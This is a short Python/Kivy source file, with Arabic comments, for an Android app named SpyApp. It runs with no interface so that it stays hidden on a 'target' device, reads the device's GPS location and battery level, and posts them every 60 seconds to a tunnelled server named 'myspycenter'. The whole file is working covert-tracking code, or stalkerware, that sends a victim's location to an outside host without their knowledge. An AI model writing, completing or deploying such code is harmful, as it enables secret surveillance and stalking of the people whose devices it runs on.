import requests
import time
from plyer import battery, gps
from kivy.app import App
from kivy.clock import Clock

# ضع هنا IP كمبيوترك الحقيقي
# الرابط الجديد من LocalTunnel بدلاً من الـ IP الداخلي
SERVER_URL = "https://myspycenter.loca.lt/report"

class SpyApp(App):
    def build(self):
        # تشغيل عملية الإرسال كل 60 ثانية في الخلفية
        Clock.schedule_interval(self.send_data, 60)
        return None # لا نريد واجهة رسومية ليبقى مخفياً

    def get_location(self):
        try:
            # محاولة الحصول على إحداثيات GPS
            # ملاحظة: الـ GPS يحتاج صلاحيات وصبر ليحدد الموقع
            location = gps.location
            if location:
                return f"{location['lat']}, {location['lon']}"
            return "جاري تحديد الموقع..."
        except:
            return "الـ GPS معطل"

    def get_battery_level(self):
        try:
            return battery.status['percentage']
        except:
            return "0"

    def send_data(self, dt):
        payload = {
            "device": "Android-Device-Target",
            "location": self.get_location(),
            "battery": self.get_battery_level()
        }
        
        try:
            requests.post(SERVER_URL, json=payload, timeout=5)
            print("[+] تم إرسال التقرير بنجاح")
        except:
            print("[-] فشل في الاتصال بالسيرفر")

if __name__ == "__main__":
    SpyApp().run()